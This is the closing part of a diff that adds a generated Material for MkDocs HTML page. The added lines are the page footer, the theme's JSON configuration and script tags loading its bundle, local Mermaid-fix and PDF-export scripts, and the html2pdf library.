+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
